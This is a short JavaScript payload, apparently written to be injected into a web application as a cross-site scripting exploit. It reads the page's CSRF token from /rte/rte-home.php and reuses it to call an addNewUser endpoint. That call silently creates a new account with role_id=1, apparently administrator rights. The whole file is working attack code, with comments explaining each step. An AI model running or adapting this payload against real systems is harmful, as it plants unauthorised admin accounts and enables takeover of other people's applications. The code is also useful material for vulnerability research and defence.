function loadresponse() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) { // Check if the API response is 200 OK
            var ppp = this.responseText;
            var ooo = ppp.indexOf('sid:');
            var xxx = ppp.substring(ooo);
            var samantha = xxx.substring(0, 55);
            user(samantha); // Pass the extracted token to the user function
        }
    };
    xhttp.open("GET", "/rte/rte-home.php", true); // Send a GET request to fetch the homepage
    xhttp.send(); // Send the API GET request
}

loadresponse(); // Execute the loadresponse function

function user(token) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/rte/ajax/action.php?a=addNewUser", true); // Send a POST request to add a new user
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); // Set the request header for form data
    xhr.onreadystatechange = function() { // Define a callback function for state changes
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) { // Check if the user was added successfully
            console.log(xhr.responseText); // Log the response text to the console
        }
    };
    xhr.send("__csrf_magic=" + token + "&&name=Samantha&lastName=Czech&login=sam%2b" + Math.floor(Math.random() * 9000) + "%40meetmarigold.com&role_id=1&extra=livemail&version=videoemail&action=addNewUser"); // Send the token and user data to add the user
}